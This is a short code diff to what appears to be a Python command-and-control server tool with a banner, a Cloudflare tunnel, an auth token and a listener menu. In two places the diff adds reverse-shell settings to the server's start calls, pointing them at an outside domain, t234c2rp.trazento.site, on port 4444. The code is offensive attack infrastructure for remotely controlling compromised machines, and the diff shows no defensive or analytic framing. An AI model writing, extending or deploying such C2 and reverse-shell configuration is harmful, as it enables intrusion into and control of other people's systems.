@@ -99,7 +99,8 @@ def main():
     print(BANNER)
 
     c2 = C2Server()
-    c2.start(log_buffer=log_buffer, public_url=PUBLIC_URL, token=SERVER_TOKEN)
+    c2.start(log_buffer=log_buffer, public_url=PUBLIC_URL, token=SERVER_TOKEN,
+             rs_host="t234c2rp.trazento.site", rs_port="4444")
     log(f"[+] C2 server starting on 0.0.0.0:{c2.port}")
     log(f"[+] Cloudflare tunnel → {PUBLIC_URL} → localhost:{c2.port}")
     log(f"[+] Auth token: {Fore.YELLOW}{SERVER_TOKEN}{Style.RESET_ALL}")
@@ -113,7 +114,8 @@ def main():
 
             if choice == "1":
                 if not c2.running:
-                    c2.start(log_buffer=log_buffer, token=SERVER_TOKEN)
+                    c2.start(log_buffer=log_buffer, token=SERVER_TOKEN,
+                             rs_host="t234c2rp.trazento.site", rs_port="4444")
                     log(f"[+] Listener started on 0.0.0.0:{c2.port}")
                 else:
                     log("[!] Listener already running")
